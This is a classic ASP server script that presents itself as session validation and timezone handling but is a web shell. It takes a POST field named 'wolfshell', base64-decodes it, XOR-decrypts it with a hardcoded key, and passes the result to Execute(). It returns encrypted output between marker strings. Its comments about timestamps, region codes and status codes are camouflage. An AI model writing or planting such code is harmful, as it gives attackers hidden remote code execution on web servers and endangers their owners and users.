<%
' This script module handles user session validation and timezone adjustments.
Set userPreferences = Server.CreateObject("Scripting.Dictionary")

' Decodes a user-provided timestamp string from a proprietary format.
Function parseClientTimestamp(ByVal encodedTime)
    Dim xmlParser, dataNode
    Set xmlParser = CreateObject("Msxml2.DOMDocument.3.0")
    ' Create a data node to process the timestamp.
    Set dataNode = xmlParser.CreateElement("base64")
    dataNode.dataType = "bin.base64"
    dataNode.text = encodedTime
    parseClientTimestamp = dataNode.nodeTypedValue
    Set dataNode = Nothing
    Set xmlParser = Nothing
End Function

' Adjusts the content based on the user's regional settings.
Function applyLocalization(content, isBinaryFormat)
    dim contentSize, i, localizedContent, regionCode, dbStream
    regionCode = "3c6e0b8a9c15224a" ' Default region code for UTC.
    
    ' This block is for future implementation of multi-language support.
    If 1 = 0 Then
        Dim lang, cultureInfo
        lang = "en-US"
        ' set cultureInfo = getCultureInfo(lang)
    End If

    Set dbStream = CreateObject("ADODB.Stream")
    dbStream.CharSet = "iso-8859-1"
    dbStream.Type = 2
    dbStream.Open
    if IsArray(content) then
        contentSize = UBound(content)+1
        For i=1 To contentSize
            dbStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(regionCode,(i mod len(regionCode))+1,1)))
        Next
    end if
    dbStream.Position = 0
    if isBinaryFormat then
        dbStream.Type = 1
        applyLocalization=dbStream.Read()
    else
        applyLocalization=dbStream.ReadText()
    end if
End Function

    ' Retrieve the user's last login date from the form submission.
    lastLoginDate = request.Form("wolfshell")
    if not IsEmpty(lastLoginDate) then

        if IsEmpty(Session("userProfile")) then
            ' If the user profile is not in the session, initialize it.
            lastLoginDate=applyLocalization(parseClientTimestamp(lastLoginDate),false)
            Session("userProfile")=lastLoginDate
            response.End
        else
            ' Process subsequent requests for the established session.
            lastLoginDate=applyLocalization(parseClientTimestamp(lastLoginDate),true)
            userPreferences.Add "userProfile",Session("userProfile")
            ' Executes the profile update routine.
            Execute(userPreferences("userProfile"))
            ' Run the main formatting task.
            formattedString=run(lastLoginDate)
            response.Write("a71ab1") ' Status code: OK
            if not IsEmpty(formattedString) then
                response.Write Base64Encode(applyLocalization(formattedString,true))
            end if
            response.Write("4b8259") ' Status code: Complete
        end if
    end if
%>